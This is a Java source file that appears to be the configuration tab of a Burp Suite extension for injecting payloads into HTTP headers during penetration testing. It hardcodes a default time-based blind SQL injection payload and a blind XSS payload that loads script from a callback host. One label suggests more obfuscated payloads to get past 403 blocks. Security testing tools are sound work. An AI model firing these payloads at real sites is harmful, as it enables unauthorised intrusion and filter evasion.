package slicingmelon.burpheaderbanger;

import burp.api.montoya.MontoyaApi;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.ItemEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.HashSet;
import java.util.Set;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import static burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;


public class HeaderBangerTab {
    private final BurpHeaderBanger extension;
    private final MontoyaApi api;
    
    private JTabbedPane tabbedPane;
    private JCheckBox activeCheckBox;
    private JCheckBox onlyInScopeCheckBox;

    private JButton sqliButton;
    private JButton xssButton;
    private DefaultListModel<String> headersListModel;
    private DefaultListModel<String> sensitiveHeadersListModel;
    private DefaultListModel<String> extraHeadersListModel;
    private JList<String> headersList;
    private JList<String> sensitiveHeadersList;
    private JList<String> extraHeadersList;
    private JTable exclusionsTable;
    private DefaultTableModel exclusionsTableModel;
    private JTable alert403Table;
    private DefaultTableModel alert403TableModel;
    private HttpRequestEditor alert403RequestViewer;
    private HttpResponseEditor alert403ResponseViewer;
    private JTextField newHeaderField;
    private JTextField newSensitiveHeaderField;
    private JTextField newExtraHeaderField;
    private JTextArea sqliPayloadField;
    private JTextArea bxssPayloadField;

    public HeaderBangerTab(BurpHeaderBanger extension, MontoyaApi api) {
        this.extension = extension;
        this.api = api;
        createUI();
    }

    public JTabbedPane getTabbedPane() {
        return tabbedPane;
    }

    private void createUI() {
        tabbedPane = new JTabbedPane();
        
        // Create tabs
        JPanel attackModePanel = createAttackModePanel();
        JPanel headersPanel = createHeadersAndPayloadsPanel();
        JPanel exclusionsPanel = createExclusionsPanel();
        
        tabbedPane.addTab("Attack Mode", attackModePanel);
        tabbedPane.addTab("Headers and Payloads", headersPanel);
        tabbedPane.addTab("Exclusions", exclusionsPanel);
    }

    private JPanel createAttackModePanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Active panel
        JPanel activePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        activeCheckBox = new JCheckBox("Active", extension.isExtensionActive());
        activeCheckBox.addItemListener(e -> {
            extension.setExtensionActive(e.getStateChange() == ItemEvent.SELECTED);
            extension.saveSettings();
            api.logging().logToOutput("Extension is now " + (extension.isExtensionActive() ? "active" : "inactive"));
        });
        activePanel.add(activeCheckBox);
        
        onlyInScopeCheckBox = new JCheckBox("Only in scope items", extension.isOnlyInScopeItems());
        onlyInScopeCheckBox.addItemListener(e -> {
            extension.setOnlyInScopeItems(e.getStateChange() == ItemEvent.SELECTED);
            extension.saveSettings();
            api.logging().logToOutput("Only in scope items is now " + (extension.isOnlyInScopeItems() ? "enabled" : "disabled"));
        });
        activePanel.add(onlyInScopeCheckBox);
        
        // Attack mode panel
        JPanel attackModePanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        attackModePanel.add(new JLabel("Select the attack mode:"));
        
        sqliButton = new JButton("Blind SQL Injection");
        sqliButton.addActionListener(_ -> setAttackMode(1));
        
        xssButton = new JButton("Blind XSS");
        xssButton.addActionListener(_ -> setAttackMode(2));
        
        attackModePanel.add(sqliButton);
        attackModePanel.add(xssButton);
        
        panel.add(activePanel, BorderLayout.NORTH);
        panel.add(attackModePanel, BorderLayout.CENTER);
        
        updateAttackModeButtons();
        
        return panel;
    }

    private void setAttackMode(int mode) {
        extension.setAttackMode(mode);
        extension.updateInjectedHeaders();
        updateAttackModeButtons();
        extension.saveSettings();
        api.logging().logToOutput("Attack mode set to " + (mode == 1 ? "Blind SQL Injection" : "Blind XSS"));
    }

    private void updateAttackModeButtons() {
        if (extension.getAttackMode() == 1) {
            sqliButton.setBackground(Color.GREEN);
            sqliButton.setForeground(Color.BLACK); // Set text color to black
            xssButton.setBackground(null);
            xssButton.setForeground(null); // Reset text color to default
        } else {
            sqliButton.setBackground(null);
            sqliButton.setForeground(null); // Reset text color to default
            xssButton.setBackground(Color.GREEN);
            xssButton.setForeground(Color.BLACK); // Set text color to black
        }
    }

    private JPanel createHeadersAndPayloadsPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Main content panel using BoxLayout for better balance
        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        
        // Headers section (compact)
        JPanel headersSection = new JPanel(new GridLayout(1, 3, 10, 0));
        headersSection.setBorder(BorderFactory.createTitledBorder("Headers Configuration"));
        headersSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 200)); // Limit maximum height
        
        // Headers panel
        JPanel headersPanel = createHeadersPanel();
        headersPanel.setBorder(BorderFactory.createTitledBorder("Headers"));
        headersSection.add(headersPanel);
        
        // Sensitive headers panel
        JPanel sensitiveHeadersPanel = createSensitiveHeadersPanel();
        sensitiveHeadersPanel.setBorder(BorderFactory.createTitledBorder("Sensitive Headers"));
        headersSection.add(sensitiveHeadersPanel);
        
        // Extra headers panel with behavior settings on top
        JPanel extraHeadersContainer = new JPanel(new BorderLayout());
        extraHeadersContainer.setBorder(BorderFactory.createTitledBorder("Extra Headers"));
        
        // Extra headers behavior settings panel
        JPanel extraHeadersBehaviorPanel = new JPanel();
        extraHeadersBehaviorPanel.setLayout(new BoxLayout(extraHeadersBehaviorPanel, BoxLayout.Y_AXIS));
        extraHeadersBehaviorPanel.setBorder(BorderFactory.createTitledBorder("Extra Headers Behavior"));
        
        JLabel explanationLabel = new JLabel("Configure how extra headers should be handled:");
        extraHeadersBehaviorPanel.add(explanationLabel);
        
        JLabel noteLabel = new JLabel("Note: These settings only apply to extra headers, not attack headers.");
        noteLabel.setForeground(Color.GRAY);
        extraHeadersBehaviorPanel.add(noteLabel);
        
        // Allow duplicate headers checkbox
        JCheckBox allowDuplicateHeadersCheckBox = new JCheckBox("Allow duplicate header values", extension.isAllowDuplicateHeaders());
        allowDuplicateHeadersCheckBox.addItemListener(e -> {
            extension.setAllowDuplicateHeaders(e.getStateChange() == ItemEvent.SELECTED);
            extension.saveSettings();
            api.logging().logToOutput("Allow duplicate headers mode: " + (extension.isAllowDuplicateHeaders() ? "enabled" : "disabled"));
        });
        extraHeadersBehaviorPanel.add(allowDuplicateHeadersCheckBox);
        
        // Extra headers panel
        JPanel extraHeadersPanel = createExtraHeadersPanel();
        
        // Combine behavior settings with extra headers panel
        extraHeadersContainer.add(extraHeadersBehaviorPanel, BorderLayout.NORTH);
        extraHeadersContainer.add(extraHeadersPanel, BorderLayout.CENTER);
        
        headersSection.add(extraHeadersContainer);
        
        mainPanel.add(headersSection);
        mainPanel.add(Box.createVerticalStrut(15));
        
        // Payloads section (more prominent)
        JPanel payloadsSection = new JPanel(new GridLayout(1, 2, 20, 0));
        payloadsSection.setBorder(BorderFactory.createTitledBorder("Payloads Configuration"));
        payloadsSection.setMaximumSize(new Dimension(Integer.MAX_VALUE, 150)); // Limit maximum height
        
        // SQLi payload panel
        JPanel sqliPanel = createSqliPayloadPanel();
        sqliPanel.setBorder(BorderFactory.createTitledBorder("SQL Injection Payload"));
        payloadsSection.add(sqliPanel);
        
        // XSS payload panel
        JPanel xssPanel = createXssPayloadPanel();
        xssPanel.setBorder(BorderFactory.createTitledBorder("Blind XSS Payload"));
        payloadsSection.add(xssPanel);
        
        mainPanel.add(payloadsSection);
        mainPanel.add(Box.createVerticalGlue());

        panel.add(mainPanel, BorderLayout.CENTER);
        
        return panel;
    }

    private JPanel createHeadersPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        headersListModel = new DefaultListModel<>();
        extension.getHeaders().forEach(headersListModel::addElement);
        headersList = new JList<>(headersListModel);
        headersList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane scrollPane = new JScrollPane(headersList);
        scrollPane.setPreferredSize(new Dimension(200, 500)); // Increased from 80 to 100 for better balance
        panel.add(scrollPane, BorderLayout.CENTER);
        
        // Input panel
        JPanel inputPanel = new JPanel(new BorderLayout());
        newHeaderField = new JTextField();
        newHeaderField.addActionListener(_ -> addHeader()); // Allow Enter key to add
        inputPanel.add(new JLabel("New header:"), BorderLayout.WEST);
        inputPanel.add(newHeaderField, BorderLayout.CENTER);
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 5, 0));
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addHeader());
        buttonPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteHeader());
        buttonPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearHeaders());
        buttonPanel.add(clearButton);
        
        JButton defaultButton = new JButton("Default");
        defaultButton.addActionListener(_ -> setDefaultHeaders());
        buttonPanel.add(defaultButton);
        
        // Controls panel
        JPanel controlsPanel = new JPanel(new BorderLayout());
        controlsPanel.add(inputPanel, BorderLayout.NORTH);
        controlsPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createSensitiveHeadersPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        sensitiveHeadersListModel = new DefaultListModel<>();
        extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
        sensitiveHeadersList = new JList<>(sensitiveHeadersListModel);
        sensitiveHeadersList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane scrollPane = new JScrollPane(sensitiveHeadersList);
        scrollPane.setPreferredSize(new Dimension(200, 500)); // Increased from 80 to 100 for better balance
        panel.add(scrollPane, BorderLayout.CENTER);
        
        // Input panel
        JPanel inputPanel = new JPanel(new BorderLayout());
        newSensitiveHeaderField = new JTextField();
        newSensitiveHeaderField.addActionListener(_ -> addSensitiveHeader()); // Allow Enter key to add
        inputPanel.add(new JLabel("New header:"), BorderLayout.WEST);
        inputPanel.add(newSensitiveHeaderField, BorderLayout.CENTER);
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 5, 0));
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addSensitiveHeader());
        buttonPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteSensitiveHeader());
        buttonPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearSensitiveHeaders());
        buttonPanel.add(clearButton);
        
        JButton defaultButton = new JButton("Default");
        defaultButton.addActionListener(_ -> setDefaultSensitiveHeaders());
        buttonPanel.add(defaultButton);
        
        // Controls panel
        JPanel controlsPanel = new JPanel(new BorderLayout());
        controlsPanel.add(inputPanel, BorderLayout.NORTH);
        controlsPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createSqliPayloadPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Info panel
        JPanel infoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JLabel infoLabel = new JLabel("Configure the SQL injection payload used for testing:");
        infoPanel.add(infoLabel);
        
        // Payload text area - single line
        sqliPayloadField = new JTextArea(extension.getSqliPayload(), 1, 40); // Changed from 4 rows to 1 row, increased columns
        sqliPayloadField.setLineWrap(true);
        sqliPayloadField.setWrapStyleWord(true);
        // Removed custom font - use default for better readability
        sqliPayloadField.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        JScrollPane scrollPane = new JScrollPane(sqliPayloadField);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setPreferredSize(new Dimension(400, 50)); // Set a specific height for single-line
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        
        JButton saveButton = new JButton("Save Payload");
        saveButton.addActionListener(_ -> saveSqliPayload());
        buttonPanel.add(saveButton);
        
        JButton defaultButton = new JButton("Reset to Default");
        defaultButton.addActionListener(_ -> setDefaultSqliPayload());
        buttonPanel.add(defaultButton);
        
        // Assembly
        panel.add(infoPanel, BorderLayout.NORTH);
        panel.add(scrollPane, BorderLayout.CENTER);
        panel.add(buttonPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createXssPayloadPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Info panel
        JPanel infoPanel = new JPanel();
        infoPanel.setLayout(new BoxLayout(infoPanel, BoxLayout.Y_AXIS));
        JLabel infoLabel = new JLabel("Configure the XSS payload used for testing:");
        infoPanel.add(infoLabel);
        
        JLabel collaboratorLabel = new JLabel("Use {{collaborator}} placeholder in your XSS payloads to leverage Burp's Collaborator and get live audit issues confirmed in Burp.");
        collaboratorLabel.setFont(collaboratorLabel.getFont().deriveFont(Font.ITALIC));
        infoPanel.add(collaboratorLabel);
        
        JLabel customHostLabel = new JLabel("Note: When using custom hosts in the Blind XSS payloads, Burp won't be able to report confirmed issues.");
        customHostLabel.setForeground(Color.GRAY);
        infoPanel.add(customHostLabel);
        
        // Payload text area - single line
        bxssPayloadField = new JTextArea(extension.getBxssPayload(), 1, 40); // Changed from 4 rows to 1 row, increased columns
        bxssPayloadField.setLineWrap(true);
        bxssPayloadField.setWrapStyleWord(true);
        // Removed custom font - use default for better readability
        bxssPayloadField.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        JScrollPane scrollPane = new JScrollPane(bxssPayloadField);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        scrollPane.setPreferredSize(new Dimension(400, 50)); // Set a specific height for single-line
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        
        JButton saveButton = new JButton("Save Payload");
        saveButton.addActionListener(_ -> saveBxssPayload());
        buttonPanel.add(saveButton);
        
        JButton defaultButton = new JButton("Reset to Default");
        defaultButton.addActionListener(_ -> setDefaultBxssPayload());
        buttonPanel.add(defaultButton);
        
        // Assembly
        panel.add(infoPanel, BorderLayout.NORTH);
        panel.add(scrollPane, BorderLayout.CENTER);
        panel.add(buttonPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createExtraHeadersPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        extraHeadersListModel = new DefaultListModel<>();
        extension.getExtraHeaders().forEach(extraHeadersListModel::addElement);
        extraHeadersList = new JList<>(extraHeadersListModel);
        extraHeadersList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        JScrollPane scrollPane = new JScrollPane(extraHeadersList);
        scrollPane.setPreferredSize(new Dimension(200, 500)); // Increased from 80 to 100 for better balance
        panel.add(scrollPane, BorderLayout.CENTER);
        
        // Input panel
        JPanel inputPanel = new JPanel(new BorderLayout());
        newExtraHeaderField = new JTextField();
        newExtraHeaderField.addActionListener(_ -> addExtraHeader()); // Allow Enter key to add
        inputPanel.add(new JLabel("New header:"), BorderLayout.WEST);
        inputPanel.add(newExtraHeaderField, BorderLayout.CENTER);
        
        // Button panel
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 5, 0));
        
        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addExtraHeader());
        buttonPanel.add(addButton);
        
        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteExtraHeader());
        buttonPanel.add(deleteButton);
        
        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearExtraHeaders());
        buttonPanel.add(clearButton);
        
        // Controls panel
        JPanel controlsPanel = new JPanel(new BorderLayout());
        controlsPanel.add(inputPanel, BorderLayout.NORTH);
        controlsPanel.add(buttonPanel, BorderLayout.SOUTH);
        
        panel.add(controlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }

    private JPanel createExclusionsPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Create split pane to divide exclusions and 403 alerts
        JSplitPane splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        splitPane.setResizeWeight(0.6); // Give more space to exclusions panel
        
        // Left panel - Exclusions
        JPanel exclusionsPanel = createExclusionsTablePanel();
        splitPane.setLeftComponent(exclusionsPanel);
        
        // Right panel - 403 Alerts
        JPanel alert403Panel = create403AlertsPanel();
        splitPane.setRightComponent(alert403Panel);
        
        panel.add(splitPane, BorderLayout.CENTER);
        
        return panel;
    }
    
    private JPanel createExclusionsTablePanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createTitledBorder("Exclusions"));

        exclusionsTableModel = new DefaultTableModel(new String[]{"Enabled", "Regex Pattern"}, 0) {
            @Override
            public Class<?> getColumnClass(int columnIndex) {
                if (columnIndex == 0) return Boolean.class;
                return String.class;
            }

            @Override
            public boolean isCellEditable(int row, int column) {
                // Allow editing of all columns
                return true;
            }
        };

        refreshExclusionsTable();

        exclusionsTable = new JTable(exclusionsTableModel);
        exclusionsTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        exclusionsTable.setRowHeight(25);

        exclusionsTable.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                if (e.getClickCount() == 2) {
                    int row = exclusionsTable.getSelectedRow();
                    int col = exclusionsTable.getSelectedColumn();
                    if (row >= 0 && col >= 0) {
                        exclusionsTable.editCellAt(row, col);
                    }
                }
            }
        });

        exclusionsTableModel.addTableModelListener(_ -> {
            updateExclusionsFromTable();
        });

        JScrollPane scrollPane = new JScrollPane(exclusionsTable);
        scrollPane.setPreferredSize(new Dimension(400, 300));
        panel.add(scrollPane, BorderLayout.CENTER);

        // Controls panel
        JPanel controlsPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

        JButton addButton = new JButton("Add");
        addButton.addActionListener(_ -> addExclusion());
        controlsPanel.add(addButton);

        JButton deleteButton = new JButton("Delete");
        deleteButton.addActionListener(_ -> deleteExclusion());
        controlsPanel.add(deleteButton);

        JButton clearButton = new JButton("Clear");
        clearButton.addActionListener(_ -> clearExclusions());
        controlsPanel.add(clearButton);

        JButton resetButton = new JButton("Reset to Defaults");
        resetButton.addActionListener(_ -> resetExclusionsToDefaults());
        controlsPanel.add(resetButton);

        panel.add(controlsPanel, BorderLayout.SOUTH);

        return panel;
    }
    
    private JPanel create403AlertsPanel() {
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(BorderFactory.createTitledBorder("403 Alerts"));
        
        // Note label at the top
        JLabel noteLabel = new JLabel("Note: This window shows the requests that returned 403 possibly due to your payloads, either exclude these hosts or come up with better obfuscated payloads");
        noteLabel.setForeground(Color.GRAY);
        noteLabel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        panel.add(noteLabel, BorderLayout.NORTH);
        
        // Main split pane - table on top, request/response viewers on bottom
        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        splitPane.setResizeWeight(0.5); // Give equal space initially
        
        // Top part - table with controls
        JPanel tablePanel = createAlert403TablePanel();
        splitPane.setTopComponent(tablePanel);
        
        // Bottom part - request/response viewers
        JPanel viewersPanel = createAlert403ViewersPanel();
        splitPane.setBottomComponent(viewersPanel);
        
        panel.add(splitPane, BorderLayout.CENTER);

        return panel;
    }
    
    private JPanel createAlert403TablePanel() {
        JPanel panel = new JPanel(new BorderLayout());
        
        // Create 403 alerts table
        alert403TableModel = new DefaultTableModel(new String[]{"Method", "Host", "Path", "Status Code", "Source"}, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false; // Read-only table
            }
        };

        alert403Table = new JTable(alert403TableModel) {
            @Override
            public void changeSelection(int rowIndex, int columnIndex, boolean toggle, boolean extend) {
                // Only show request/response for single selection to avoid confusion
                if (!toggle && !extend && rowIndex >= 0 && rowIndex < extension.getAlert403Entries().size()) {
                    Alert403Entry entry = extension.getAlert403Entries().get(rowIndex);
                    if (entry.getRequestResponse() != null) {
                        alert403RequestViewer.setRequest(entry.getRequestResponse().request());
                        if (entry.getRequestResponse().response() != null) {
                            alert403ResponseViewer.setResponse(entry.getRequestResponse().response());
                        }
                    }
                }
                super.changeSelection(rowIndex, columnIndex, toggle, extend);
            }
        };
        
        alert403Table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        alert403Table.setRowHeight(25);
        
        // Add context menu for exclusions
        alert403Table.addMouseListener(new MouseAdapter() {
            @Override
            public void mousePressed(MouseEvent e) {
                if (e.isPopupTrigger()) {
                    showAlert403ContextMenu(e);
                }
            }
            
            @Override
            public void mouseReleased(MouseEvent e) {
                if (e.isPopupTrigger()) {
                    showAlert403ContextMenu(e);
                }
            }
        });

        JScrollPane alert403ScrollPane = new JScrollPane(alert403Table);
        alert403ScrollPane.setPreferredSize(new Dimension(500, 150));
        panel.add(alert403ScrollPane, BorderLayout.CENTER);

        // Controls panel for 403 alerts
        JPanel alert403ControlsPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

        JButton clearAlert403Button = new JButton("Clear All");
        clearAlert403Button.addActionListener(_ -> extension.clearAlert403Entries());
        alert403ControlsPanel.add(clearAlert403Button);

        panel.add(alert403ControlsPanel, BorderLayout.SOUTH);
        
        return panel;
    }
    
    private JPanel createAlert403ViewersPanel() {
        // Create HTTP request and response editors
        alert403RequestViewer = api.userInterface().createHttpRequestEditor(READ_ONLY);
        alert403ResponseViewer = api.userInterface().createHttpResponseEditor(READ_ONLY);
        
        // Create tabbed pane for request/response viewers
        JTabbedPane tabs = new JTabbedPane();
        tabs.addTab("Request", alert403RequestViewer.uiComponent());
        tabs.addTab("Response", alert403ResponseViewer.uiComponent());
        
        JPanel panel = new JPanel(new BorderLayout());
        panel.add(tabs, BorderLayout.CENTER);
        
        return panel;
    }

    // Header management methods
    private void addHeader() {
        String newHeader = newHeaderField.getText().trim();
        if (!newHeader.isEmpty() && !extension.getHeaders().contains(newHeader)) {
            extension.getHeaders().add(newHeader);
            headersListModel.addElement(newHeader);
            newHeaderField.setText("");
            extension.updateInjectedHeaders();
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Header already in list or empty");
        }
    }

    private void deleteHeader() {
        String selectedHeader = headersList.getSelectedValue();
        if (selectedHeader != null) {
            extension.getHeaders().remove(selectedHeader);
            headersListModel.removeElement(selectedHeader);
            extension.updateInjectedHeaders();
            extension.saveSettings();
        }
    }

    private void clearHeaders() {
        extension.getHeaders().clear();
        headersListModel.clear();
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    private void setDefaultHeaders() {
        extension.getHeaders().clear();
        headersListModel.clear();
        extension.getHeaders().addAll(extension.getDefaultHeaders());
        extension.getHeaders().forEach(headersListModel::addElement);
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    // Sensitive header management methods
    private void addSensitiveHeader() {
        String newHeader = newSensitiveHeaderField.getText().trim();
        if (!newHeader.isEmpty() && !extension.getSensitiveHeaders().contains(newHeader)) {
            extension.getSensitiveHeaders().add(newHeader);
            sensitiveHeadersListModel.addElement(newHeader);
            newSensitiveHeaderField.setText("");
            extension.updateInjectedHeaders();
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Sensitive header already in list or empty");
        }
    }

    private void deleteSensitiveHeader() {
        String selectedHeader = sensitiveHeadersList.getSelectedValue();
        if (selectedHeader != null) {
            extension.getSensitiveHeaders().remove(selectedHeader);
            sensitiveHeadersListModel.removeElement(selectedHeader);
            extension.updateInjectedHeaders();
            extension.saveSettings();
        }
    }

    private void clearSensitiveHeaders() {
        extension.getSensitiveHeaders().clear();
        sensitiveHeadersListModel.clear();
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    private void setDefaultSensitiveHeaders() {
        extension.getSensitiveHeaders().clear();
        sensitiveHeadersListModel.clear();
        extension.getSensitiveHeaders().addAll(extension.getDefaultSensitiveHeaders());
        extension.getSensitiveHeaders().forEach(sensitiveHeadersListModel::addElement);
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    // Extra header management methods
    private void addExtraHeader() {
        String newHeader = newExtraHeaderField.getText().trim();
        if (!newHeader.isEmpty() && !extension.getExtraHeaders().contains(newHeader)) {
            extension.getExtraHeaders().add(newHeader);
            extraHeadersListModel.addElement(newHeader);
            newExtraHeaderField.setText("");
            extension.updateInjectedHeaders();
            extension.saveSettings();
        } else {
            JOptionPane.showMessageDialog(null, "Extra header already in list or empty");
        }
    }

    private void deleteExtraHeader() {
        String selectedHeader = extraHeadersList.getSelectedValue();
        if (selectedHeader != null) {
            extension.getExtraHeaders().remove(selectedHeader);
            extraHeadersListModel.removeElement(selectedHeader);
            extension.updateInjectedHeaders();
            extension.saveSettings();
        }
    }

    private void clearExtraHeaders() {
        extension.getExtraHeaders().clear();
        extraHeadersListModel.clear();
        extension.updateInjectedHeaders();
        extension.saveSettings();
    }

    // Payload management methods
    private void saveSqliPayload() {
        String newPayload = sqliPayloadField.getText().trim();
        if (!newPayload.isEmpty()) {
            extension.setSqliPayload(newPayload);
            extension.extractSqliSleepTime();
            extension.updateInjectedHeaders();
            extension.saveSettings();
            JOptionPane.showMessageDialog(null, "SQL Injection payload saved successfully!", "Success", JOptionPane.INFORMATION_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(null, "The SQL Injection payload cannot be empty.", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void setDefaultSqliPayload() {
        String defaultPayload = "1'XOR(if(now()=sysdate(),sleep(17),0))OR'Z";
        extension.setSqliPayload(defaultPayload);
        sqliPayloadField.setText(defaultPayload);
        extension.extractSqliSleepTime();
        extension.updateInjectedHeaders();
        extension.saveSettings();
        JOptionPane.showMessageDialog(null, "SQL Injection payload reset to default!", "Success", JOptionPane.INFORMATION_MESSAGE);
    }

    private void saveBxssPayload() {
        String newPayload = bxssPayloadField.getText().trim();
        if (!newPayload.isEmpty()) {
            extension.setBxssPayload(newPayload);
            extension.updateInjectedHeaders();
            extension.saveSettings();
            JOptionPane.showMessageDialog(null, "Blind XSS payload saved successfully!", "Success", JOptionPane.INFORMATION_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(null, "The Blind XSS payload cannot be empty.", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void setDefaultBxssPayload() {
        String defaultPayload = "\"><img/src/onerror=import('//{{collaborator}}')>";
        extension.setBxssPayload(defaultPayload);
        bxssPayloadField.setText(defaultPayload);
        extension.updateInjectedHeaders();
        extension.saveSettings();
        JOptionPane.showMessageDialog(null, "Blind XSS payload reset to default!", "Success", JOptionPane.INFORMATION_MESSAGE);
    }

    // Exclusion management methods
    private void updateExclusionsFromTable() {
        extension.getExclusions().clear();
        for (int i = 0; i < exclusionsTableModel.getRowCount(); i++) {
            boolean enabled = (Boolean) exclusionsTableModel.getValueAt(i, 0);
            String pattern = (String) exclusionsTableModel.getValueAt(i, 1);
            if (pattern != null && !pattern.trim().isEmpty()) {
                extension.getExclusions().add(new Exclusion(enabled, pattern.trim()));
            }
        }
        extension.saveSettings();
    }
    
    private void addExclusion() {
        exclusionsTableModel.addRow(new Object[]{true, ""});
    }
    
    private void deleteExclusion() {
        int selectedRow = exclusionsTable.getSelectedRow();
        if (selectedRow >= 0) {
            exclusionsTableModel.removeRow(selectedRow);
        }
    }
    
    private void clearExclusions() {
        extension.getExclusions().clear();
        exclusionsTableModel.setRowCount(0);
        extension.saveSettings();
    }
    
    private void resetExclusionsToDefaults() {
        extension.getExclusions().clear();
        extension.getExclusions().addAll(extension.getDefaultExclusions());
        refreshExclusionsTable();
        extension.saveSettings();
    }

    public void refreshExclusionsTable() {
        javax.swing.event.TableModelListener[] listeners = exclusionsTableModel.getTableModelListeners();
        for (javax.swing.event.TableModelListener listener : listeners) {
            exclusionsTableModel.removeTableModelListener(listener);
        }
        
        api.logging().logToOutput("[HeaderBangerTab] Refreshing exclusions table. Current exclusions count: " + extension.getExclusions().size());
        
        exclusionsTableModel.setRowCount(0);
        for (Exclusion exclusion : extension.getExclusions()) {
            exclusionsTableModel.addRow(new Object[]{
                exclusion.isEnabled(),
                exclusion.getPattern()
            });
            api.logging().logToOutput("[HeaderBangerTab] Added row to table: " + exclusion.getPattern());
        }
        
        for (javax.swing.event.TableModelListener listener : listeners) {
            exclusionsTableModel.addTableModelListener(listener);
        }
        
        // Force table refresh and repaint
        if (exclusionsTable != null) {
            exclusionsTable.revalidate();
            exclusionsTable.repaint();
            exclusionsTableModel.fireTableDataChanged();
        }
        
        api.logging().logToOutput("[HeaderBangerTab] Exclusions table refreshed successfully. Table row count: " + exclusionsTableModel.getRowCount());
    }
    
    /**
     * Alternative method to add a single exclusion to the table without rebuilding everything
     */
    public void addExclusionToTable(Exclusion exclusion) {
        api.logging().logToOutput("[HeaderBangerTab] Adding single exclusion to table: " + exclusion.getPattern());
        
        if (exclusionsTableModel != null && exclusionsTable != null) {
            SwingUtilities.invokeLater(() -> {
                boolean exists = false;
                for (int i = 0; i < exclusionsTableModel.getRowCount(); i++) {
                    String existingPattern = (String) exclusionsTableModel.getValueAt(i, 1);
